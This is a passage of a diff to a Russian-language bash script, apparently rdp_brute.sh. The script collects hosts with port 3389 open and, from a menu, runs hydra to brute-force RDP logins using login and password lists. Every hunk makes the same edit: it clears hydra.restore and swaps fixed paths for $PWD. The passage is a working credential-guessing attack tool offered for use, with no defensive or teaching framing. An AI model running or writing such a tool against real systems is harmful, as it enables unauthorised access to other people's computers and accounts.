@@ -6066,6 +6390,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6077,7 +6405,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6087,7 +6415,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6097,7 +6425,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6106,7 +6434,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6135,6 +6463,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6146,7 +6478,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6156,7 +6488,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6166,7 +6498,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6175,7 +6507,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6204,6 +6536,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6215,7 +6551,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6225,7 +6561,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6235,7 +6571,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6244,7 +6580,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6273,6 +6609,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6284,7 +6624,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6294,7 +6634,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6304,7 +6644,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6313,7 +6653,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6342,6 +6682,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6353,7 +6697,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6363,7 +6707,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6373,7 +6717,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6382,7 +6726,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6411,6 +6755,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6422,7 +6770,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6432,7 +6780,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6442,7 +6790,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6451,7 +6799,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6480,6 +6828,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6491,7 +6843,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6501,7 +6853,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6511,7 +6863,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6520,7 +6872,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6549,6 +6901,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6560,7 +6916,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6570,7 +6926,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6580,7 +6936,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6589,7 +6945,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6618,6 +6974,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6629,7 +6989,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6639,7 +6999,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6649,7 +7009,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6658,7 +7018,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6688,6 +7048,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 echo ""
 
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6699,7 +7063,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6709,7 +7073,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6719,7 +7083,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6728,7 +7092,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6754,6 +7118,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6765,7 +7133,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6775,7 +7143,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6785,7 +7153,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6794,7 +7162,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6822,6 +7190,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6833,7 +7205,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6843,7 +7215,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6853,7 +7225,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6862,7 +7234,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6891,6 +7263,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6902,7 +7278,7 @@ read -p "   Выбор из меню : " brutmenu
